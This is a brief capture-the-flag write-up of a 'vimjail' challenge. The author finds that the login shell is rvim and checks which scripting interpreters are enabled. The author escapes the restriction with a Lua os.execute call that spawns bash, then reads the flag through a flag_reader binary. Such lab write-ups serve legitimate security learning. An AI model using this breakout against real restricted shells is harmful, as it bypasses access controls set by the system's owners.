# vimjail writeup

Not surprisingly, we're dropped into vim when logging in over ssh.
The question is, how do we get out of vim?

Normally, you can execute commands using `:!<command>`. Let's try it by running
`:!ls` and see if we get any output back.

`E145: Shell commands not allowed in rvim` :(

Now we know that the login shell is, in fact, `rvim`, a restricted version of
vim where running shell commands is not allowed.

There is another way to run shell commands in vim, though. We can try to use one
of the scripting languages that vim supports: python, ruby, and lua.

To see if an interpreter is enabled in vim, we can run `:echo has("<language>")`

* `:echo has("python2") => 0`
* `:echo has("python3") => 0`
* `:echo has("ruby") => 0`
* `:echo has("lua") => 1`

Score! We can run LUA inside rvim! To spawn a shell with LUA, we run:
`:lua os.execute("/bin/bash")`. Run `reset` to fix the terminal.

From the task description, we know that the `flag` user has the flag.
```
$ cd /home/flag
$ ls
flag_reader  flag.txt
$ cat flag.txt
cat: flag.txt: Permission denied
$ ./flag_reader
TG18{heres_your_get_out_of_vim_free_card}
```
